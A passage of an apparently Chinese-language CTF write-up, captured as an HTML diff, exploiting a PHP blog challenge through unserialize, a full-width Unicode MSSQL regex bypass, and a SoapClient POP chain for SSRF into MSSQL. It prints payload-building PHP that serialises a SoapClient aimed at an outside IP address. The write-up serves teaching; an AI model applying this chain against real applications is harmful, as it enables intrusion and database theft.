-        <span class=nv>$str</span> <span class=o>.=</span> <span class=s2>&#34;&lt;li&gt;</span><span class=si>$attach</span><span class=s2>&lt;/li&gt;&#34;</span><span class=p>;</span>
-    <span class=p>}</span>
-    <span class=nv>$str</span> <span class=o>.=</span> <span class=s2>&#34;&lt;/il&gt;&#34;</span><span class=p>;</span>
-    <span class=k>return</span> <span class=nv>$str</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></div><p>而我们看<code>Post::loadall()</code>，我们可以发现</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>load</span><span class=p>(</span><span class=nv>$id</span><span class=p>)</span> <span class=p>{</span>
-    <span class=k>global</span> <span class=nv>$USER</span><span class=p>;</span>
-    <span class=nv>$res</span> <span class=o>=</span> <span class=nx>DB</span><span class=o>::</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;SELECT * FROM posts WHERE userid = ? AND id = ?&#34;</span><span class=p>,</span>
-                     <span class=k>array</span><span class=p>(</span><span class=nv>$USER</span><span class=o>-&gt;</span><span class=na>uid</span><span class=p>,</span> <span class=nv>$id</span><span class=p>));</span>
-    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$res</span><span class=p>)</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;db error&#34;</span><span class=p>);</span>
-    <span class=nv>$res</span> <span class=o>=</span> <span class=nv>$res</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
-    <span class=nv>$post</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Post</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s2>&#34;title&#34;</span><span class=p>],</span> <span class=nv>$res</span><span class=p>[</span><span class=s2>&#34;content&#34;</span><span class=p>],</span> <span class=nv>$res</span><span class=p>[</span><span class=s2>&#34;attachment&#34;</span><span class=p>]);</span>
-    <span class=nv>$post</span><span class=o>-&gt;</span><span class=na>id</span> <span class=o>=</span> <span class=nv>$id</span><span class=p>;</span>
-    <span class=k>return</span> <span class=nv>$post</span><span class=p>;</span>
-<span class=p>}</span>
-
-<span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>loadall</span><span class=p>()</span> <span class=p>{</span>
-    <span class=k>global</span> <span class=nv>$USER</span><span class=p>;</span>
-    <span class=nv>$result</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
-    <span class=nv>$posts</span> <span class=o>=</span> <span class=nx>DB</span><span class=o>::</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;SELECT id FROM posts WHERE userid = ? ORDER BY id DESC&#34;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$USER</span><span class=o>-&gt;</span><span class=na>uid</span><span class=p>))</span> <span class=p>;</span>
-    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$posts</span><span class=p>)</span> <span class=k>return</span> <span class=nv>$result</span><span class=p>;</span>
-    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$posts</span> <span class=k>as</span> <span class=nv>$p</span><span class=p>)</span> <span class=p>{</span>
-        <span class=nv>$result</span><span class=p>[]</span> <span class=o>=</span> <span class=nx>Post</span><span class=o>::</span><span class=na>load</span><span class=p>(</span><span class=nv>$p</span><span class=p>[</span><span class=s2>&#34;id&#34;</span><span class=p>]);</span>
-    <span class=p>}</span>
-    <span class=k>return</span> <span class=nv>$result</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></div><p><code>loadall()</code>方法会逐个通过 id 调用<code>load()</code>方法，根据前面的<code>Post</code>构造方法与<code>save()</code>方法，我们可以找到保存<code>attachment</code>的方式。其实这里因为<code>echo</code>输出的是<code>$post['title']</code>、<code>$post['content']</code>，所以我们也可以放在这两者中，都会触发<code>__toString</code>的魔术方法</p>
-<p>所以大概的流程就是我们通过构造好一个<code>SoapClient</code>的 payload ，插入之后访问 default.php 触发<code>echo</code>，调用<code>$this->za->open()</code>，接着触发<code>SoapClient</code>的<code>__call()</code>魔术函数完成一次反序列化攻击。</p>
-<p>因为<code>echo</code>直接调用了反序列化的<code>__toString</code>魔术方法，我们可以直接利用<code>Attachment</code>这个类来构造 payload</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>class</span> <span class=nc>Attachment</span> <span class=p>{</span>
-    <span class=k>private</span> <span class=nv>$za</span> <span class=o>=</span> <span class=k>NULL</span><span class=p>;</span>
-    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span> <span class=p>{</span>
-            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;http://106.14.153.173:2015&#39;</span><span class=p>,</span><span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;123&#39;</span><span class=p>));</span>   
-    <span class=p>}</span>
-<span class=p>}</span>
-<span class=nv>$c</span><span class=o>=</span><span class=k>new</span> <span class=nx>Attachment</span><span class=p>();</span>
-<span class=nv>$aaa</span><span class=o>=</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
-<span class=k>echo</span> <span class=nv>$aaa</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$aaa</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
-</code></pre></div><p>利用反序列化的特点，我们可以直接定义私有变量的值，但是字符串中会有不可见字符，实验如下</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005682.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005682.jpg loading=lazy>
-</a>
-</figure></p>
-<p>所以我们需要用<code>base64_encode</code>进行编码，把编码得到的字符串再在 burp 里面进行解码构造请求。</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008851.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008851.jpg loading=lazy>
-</a>
-</figure></p>
-<h4 id=soapclient-ssrf>SoapClient SSRF</h4>
-<p>根据 hint1 ，flag 在数据库里，源码中含有数据库信息，因此我们可以利用<code>SoapClient</code>通过 SSRF 打 MSSQL。而题目也给我们提供了 miniProxy.php ，我们可以在 <a class=link href=https://github.com/joshdick/miniProxy target=_blank rel=noopener>github</a> 上可以看到相关使用说明</p>
-<blockquote>
-<p>​ miniProxy should be able to run on any web server with PHP 5.4.7 or later. miniProxy requires PHP&rsquo;s <code>curl</code> and <code>mbstring</code>extensions to be installed.</p>
-</blockquote>
-<p>大概就是一个可以让我们访问内部服务的工具。然后我们根据备份文件 default.backup 得到</p>
-<pre tabindex=0><code>server {
+</code></pre><p>uploads 处发现了两处 403 的地方，而且服务器是 Nginx，而且拿其他一些扫描器也报了目录列举的洞</p><p>可以参考<a class=link href=https://www.freebuf.com/articles/web/149761.html target=_blank rel=noopener>Nginx不安全配置可能导致的安全漏洞</a>与<a class=link href=https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html target=_blank rel=noopener>三个案例看Nginx配置安全</a></p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008852.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008852.jpg loading=lazy></a></figure></p><p>下载得到源码</p><h4 id=arbitrary-unserialize-i>Arbitrary Unserialize I</h4><p>我们可以很明显地在 db.php 中发现反序列化的影子</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>private</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>prepare_params</span><span class=p>(</span><span class=nv>$params</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>array_map</span><span class=p>(</span><span class=k>function</span><span class=p>(</span><span class=nv>$x</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$x</span><span class=p>)</span> <span class=k>or</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$x</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;$serializedobject$&#39;</span> <span class=o>.</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$x</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\$serializedobject\$/i&#39;</span><span class=p>,</span> <span class=nv>$x</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;invalid data&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$x</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=nv>$params</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>private</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>retrieve_values</span><span class=p>(</span><span class=nv>$res</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$result</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=nv>$row</span> <span class=o>=</span> <span class=nx>sqlsrv_fetch_array</span><span class=p>(</span><span class=nv>$res</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$result</span><span class=p>[]</span> <span class=o>=</span> <span class=nx>array_map</span><span class=p>(</span><span class=k>function</span><span class=p>(</span><span class=nv>$x</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\$serializedobject\$/i&#39;</span><span class=p>,</span> <span class=nv>$x</span><span class=p>)</span> <span class=o>?</span>
+</span></span><span class=line><span class=cl>                <span class=nx>unserialize</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$x</span><span class=p>,</span> <span class=mi>18</span><span class=p>))</span> <span class=o>:</span> <span class=nv>$x</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=nv>$row</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>这里还是比较明显的，但是要怎么构造这个 POP 链呢，我看了一下不是特别明显，也是涉及到了 soapclient 的构造与利用。而且整个构造也需要比较耐心来看，否则会陷入复现都比较懵逼的情况。</p><p>首先有反序列化的点，肯定需要有利用的类，否则光有反序列化的点，没有利用的类也没什么用。所以接下来我们需要去找一个可以利用的类。</p><h4 id=bypass-mssql>ByPass Mssql</h4><p>虽然确定了有反序列化漏洞，但是触发反序列化的条件就是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\$serializedobject\$/i&#39;</span><span class=p>,</span> <span class=nv>$x</span><span class=p>)</span> <span class=o>?</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$x</span><span class=p>,</span> <span class=mi>18</span><span class=p>))</span> <span class=o>:</span> <span class=nv>$x</span><span class=p>;</span>
+</span></span></code></pre></div><p>虽然前面插入数据有给数据增加<code>$serializedobject$</code>的地方，但是这里需要数组或者对象，而我们传入的只能是字符串，所以不能利用这个点。</p><p>这里怎么绕过对<code>/^\$serializedobject\$/i</code>的正则判断呢？这里就需要用到 Mssql 的一个特性了。</p><blockquote><p>​ MSSQL converts full-width unicode characters to their ASCII representation. For example, if a string contains 0xEF 0xBC 0x84, it will be stored as $.</p></blockquote><p>也就是说，**MSSQL会自动将全角unicode字符转换为ASCII表示形式。**例如，如果字符串包含<code>0xEF 0xBC 0x84</code>，则将其存储为<code>$</code>。<code>$s℮rializedobject$</code> 入库后会变成 <code>$serializedobject$</code>，注意前者的 ℮ 不是 ASCII 的 e，整个字符串的 16 进制如下，可见前者的 ℮ 的 hex 是 E284AE，而后者 e 的 ASCII 是 0x65。</p><p>所以我们可以利用这个特性进行绕过，可以用 burp 直接修改十六进制来操作</p><h4 id=soapclient>Soapclient</h4><p>这里我们简单讲一下 soapclient</p><blockquote><p>​ public SoapClient::SoapClient ( <a class=link href=http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed target=_blank rel=noopener>mixed</a> <code>$wsdl</code> [, array <code>$options</code> ] )</p><p>This constructor creates <a class=link href=http://php.net/manual/zh/class.soapclient.php target=_blank rel=noopener>SoapClient</a> objects in <em>WSDL</em> or <em>non-WSDL</em> mode.</p></blockquote><p>这是一个 php 的内部类，简单来说就是用来创建 soap 数据报文，与 wsdl 接口进行交互的。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001161.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001161.jpg loading=lazy></a></figure></p><p>其中<code>__call</code>的魔术方法就比较有意思了</p><blockquote><p>​ SoapClient::__call</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=nx>SoapClient</span><span class=o>::</span><span class=na>__call</span> <span class=p>(</span> <span class=nx>string</span> <span class=nv>$function_name</span> <span class=p>,</span> <span class=k>array</span> <span class=nv>$arguments</span> <span class=p>)</span> <span class=o>:</span> <span class=nx>mixed</span>
+</span></span></code></pre></div><p>Calling this method directly is deprecated. Usually, SOAP functions can be called as methods of the <a class=link href=http://php.net/manual/zh/class.soapclient.php target=_blank rel=noopener>SoapClient</a>object; in situations where this is not possible or additional options are needed, use <a class=link href=http://php.net/manual/zh/soapclient.soapcall.php target=_blank rel=noopener>SoapClient::__soapCall()</a>.</p></blockquote><p>当 SoapClient 建立的时候就会调用这个魔术方法。而且还有一点小特性</p><blockquote><p>​ 当调用 SoapClient 类的 __call() 魔术方法的时候，会发送一个 POST 请求，请求的参数由着 SoapClient 类的一些参数决定。</p><p>__call() 魔术方法：当调用一个类不存在的方法时候会触发这个魔术方法</p></blockquote><p>比如我们以下代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span> <span class=o>=&gt;</span> <span class=s2>&#34;http://106.14.153.173:2015&#34;</span><span class=p>,</span><span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span> <span class=s2>&#34;123&#34;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$b</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>-&gt;</span><span class=na>hack</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>当我们直接运行这段代码的时候，就因为调用了一个<code>SoapClient</code>不存在的方法<code>hack()</code>导致直接调用了<code>__call()</code>魔术方法</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005272.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005272.jpg loading=lazy></a></figure></p><p>详细可以参考<a class=link href=https://xz.aliyun.com/t/2148 target=_blank rel=noopener>N1CTF Easy&&Hard Php Writeup</a></p><p>####Arbitrary Unserialize II</p><p>好的，我们简单的介绍完了<code>soapclient</code>，接下来我们可以比较明显的看到在 post.php 处有一处类的方法的调用</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>Attachment</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$url</span> <span class=o>=</span> <span class=k>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$za</span> <span class=o>=</span> <span class=k>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$mime</span> <span class=o>=</span> <span class=k>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$url</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>url</span> <span class=o>=</span> <span class=nv>$url</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mime</span> <span class=o>=</span> <span class=p>(</span><span class=k>new</span> <span class=nx>finfo</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=s2>&#34;../&#34;</span><span class=o>.</span><span class=nv>$url</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mime</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>11</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;Zip archive&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mime</span> <span class=o>=</span> <span class=s2>&#34;Zip archive&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ZipArchive</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$str</span> <span class=o>=</span> <span class=s2>&#34;&lt;a href=&#39;</span><span class=si>{</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>url</span><span class=si>}</span><span class=s2>&#39;&gt;&#34;</span><span class=o>.</span><span class=nx>basename</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>url</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;&lt;/a&gt; (</span><span class=si>$this-&gt;mime</span><span class=s2> &#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=s2>&#34;../&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>url</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$str</span> <span class=o>.=</span> <span class=s2>&#34;with &#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span><span class=o>-&gt;</span><span class=na>numFiles</span> <span class=o>.</span> <span class=s2>&#34; Files.&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$str</span><span class=o>.</span> <span class=s2>&#34;)&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>就是在<code>this->za->open()</code>处，我们可以充分利用<code>SoapClient</code>的特点进行构造，然而我们需要触发<code>Attachment</code>这个类的<code>__toString()</code>魔术方法，则需要一个<code>echo</code>的地方，然后发现在 default.php 这里有比较好的利用的点</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
+</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;inc/post.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
+</span></span></span><span class=line><span class=cl><span class=err>    if (isset($_POST[&#34;title&#34;])) {
+</span></span></span><span class=line><span class=cl><span class=err>        $attachments = array();
+</span></span></span><span class=line><span class=cl><span class=err>        if (isset($_FILES[&#34;attach&#34;]) &amp;&amp; is_array($_FILES[&#34;attach&#34;])) {
+</span></span></span><span class=line><span class=cl><span class=err>            
+</span></span></span><span class=line><span class=cl><span class=err>            $folder = sha1(random_bytes(10));
+</span></span></span><span class=line><span class=cl><span class=err>            mkdir(&#34;../uploads/$folder&#34;);
+</span></span></span><span class=line><span class=cl><span class=err>            for ($i = 0; $i &lt; count($_FILES[&#34;attach&#34;][&#34;tmp_name&#34;]); $i++) {
+</span></span></span><span class=line><span class=cl><span class=err>                if ($_FILES[&#34;attach&#34;][&#34;error&#34;][$i] !== 0) continue;
+</span></span></span><span class=line><span class=cl><span class=err>                $name = basename($_FILES[&#34;attach&#34;][&#34;name&#34;][$i]);
+</span></span></span><span class=line><span class=cl><span class=err>                move_uploaded_file($_FILES[&#34;attach&#34;][&#34;tmp_name&#34;][$i], &#34;../uploads/$folder/$name&#34;);
+</span></span></span><span class=line><span class=cl><span class=err>                $attachments[] = new Attachment(&#34;/uploads/$folder/$name&#34;);
+</span></span></span><span class=line><span class=cl><span class=err>            }
+</span></span></span><span class=line><span class=cl><span class=err>        }
+</span></span></span><span class=line><span class=cl><span class=err>        $post = new Post($_POST[&#34;title&#34;], $_POST[&#34;content&#34;], $attachments);
+</span></span></span><span class=line><span class=cl><span class=err>        $post-&gt;save();
+</span></span></span><span class=line><span class=cl><span class=err>    }
+</span></span></span><span class=line><span class=cl><span class=err>    if (isset($_GET[&#34;action&#34;])) {
+</span></span></span><span class=line><span class=cl><span class=err>        if ($_GET[&#34;action&#34;] == &#34;restart&#34;) {
+</span></span></span><span class=line><span class=cl><span class=err>            Post::truncate();
+</span></span></span><span class=line><span class=cl><span class=err>            header(&#34;Location: /&#34;);
+</span></span></span><span class=line><span class=cl><span class=err>            die;
+</span></span></span><span class=line><span class=cl><span class=err>        } else {
+</span></span></span><span class=line><span class=cl><span class=err>?&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;?php 
+</span></span></span><span class=line><span class=cl><span class=err>            }
+</span></span></span><span class=line><span class=cl><span class=err>    }
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>    $posts = Post::loadall();
+</span></span></span><span class=line><span class=cl><span class=err>    if (empty($posts)) {
+</span></span></span><span class=line><span class=cl><span class=err>        echo &#34;&lt;b&gt;You do not have any posts. Create &lt;a href=\&#34;/?action=create\&#34;&gt;some&lt;/a&gt;!&lt;/b&gt;&#34;;
+</span></span></span><span class=line><span class=cl><span class=err>    } else {
+</span></span></span><span class=line><span class=cl><span class=err>        echo &#34;&lt;b&gt;You have &#34; . count($posts) .&#34; posts. Create &lt;a href=\&#34;/?action=create\&#34;&gt;some&lt;/a&gt; more if you want! Or &lt;a href=\&#34;/?action=restart\&#34;&gt;restart your blog&lt;/a&gt;.&lt;/b&gt;&#34;;
+</span></span></span><span class=line><span class=cl><span class=err>    }
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>    foreach($posts as $p) {
+</span></span></span><span class=line><span class=cl><span class=err>        echo $p;
+</span></span></span><span class=line><span class=cl><span class=err>        echo &#34;&lt;br&gt;&lt;br&gt;&#34;;
+</span></span></span><span class=line><span class=cl><span class=err>    }  
+</span></span></span><span class=line><span class=cl><span class=err>?&gt;
+</span></span></span></code></pre></div><p>而且在 post.php 中，<code>class Post</code>还存在一个这个魔术方法，其中把<code>$attach</code>拼接到了字符串当中，所以这里是先调用了<code>Post</code>类的<code>__toString</code>魔术方法，紧接着调用<code>Attachment</code>类的<code>__toString</code>魔术方法，也就可以调用到了<code>$this->za->open()</code>的方法。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$title</span><span class=p>,</span> <span class=nv>$content</span><span class=p>,</span> <span class=nv>$attachments</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>title</span> <span class=o>=</span> <span class=nv>$title</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span> <span class=o>=</span> <span class=nv>$content</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attachment</span> <span class=o>=</span> <span class=nv>$attachments</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>save</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$USER</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>id</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>DB</span><span class=o>::</span><span class=na>insert</span><span class=p>(</span><span class=s2>&#34;INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>                   <span class=k>array</span><span class=p>(</span><span class=nv>$USER</span><span class=o>-&gt;</span><span class=na>uid</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>title</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attachment</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>DB</span><span class=o>::</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                  <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>title</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attachment</span><span class=p>,</span> <span class=nv>$USER</span><span class=o>-&gt;</span><span class=na>uid</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>id</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$str</span> <span class=o>=</span> <span class=s2>&#34;&lt;h2&gt;</span><span class=si>{</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>title</span><span class=si>}</span><span class=s2>&lt;/h2&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$str</span> <span class=o>.=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$str</span> <span class=o>.=</span> <span class=s2>&#34;&lt;hr&gt;Attachments:&lt;br&gt;&lt;il&gt;&#34;</span><span class=p>;</span>
